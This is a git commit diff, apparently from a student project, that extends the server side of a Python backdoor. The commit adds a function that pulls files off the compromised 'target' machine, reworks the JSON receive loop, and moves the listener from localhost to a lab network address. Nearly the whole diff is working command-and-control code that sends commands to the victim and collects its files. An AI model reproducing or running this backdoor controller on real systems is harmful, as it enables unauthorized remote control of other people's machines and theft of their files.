ee6d4f7ab18a6e5183aefb14406a6effddff0ca0
Andrei <zenin.an@do-student.ru>
2023-04-18 06:59:18 +0300

    download files with backdoor

--- backdoor/server.py
+++ backdoor/server.py
@@ -4,11 +4,20 @@ from termcolor import colored
 def reliable_recv():
     data = ''
     while True:
-        try: 
-            data = data + target.recv(1024).decode().rstrip()
-            return json.loads(data)
-        except ValueError:
+        try:
+            # receive data from target
+            chunk = target.recv(1024)
+            # check if received data is empty
+            if len(chunk) == 0:
+                continue
+            data += chunk.decode('utf-8')
+            # check if data is a valid JSON object
+            if data[-1] == '}' and '{' in data:
+                return json.loads(data)
+        except Exception as e:
+            print(str(e))
             continue
+
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -17,6 +26,19 @@ def reliable_send(data):
 def upload_file(file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
 
 def target_communication():
     while True:
@@ -30,6 +52,8 @@ def target_communication():
             pass
         elif command[:6] == 'upload':
             upload_file(command[7:])
+        elif command[:8] == 'download':
+            download_file(command[9:])
         elif command == 'help':
             print(colored(''' \n
             exit                                 --> exit
@@ -46,7 +70,7 @@ def target_communication():
             print(result)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('127.0.0.1', 5555))
+sock.bind(('192.168.122.1', 5555))
 print(colored('[+] listening for connections', 'blue'))
 sock.listen(5)
 target, ip = sock.accept()
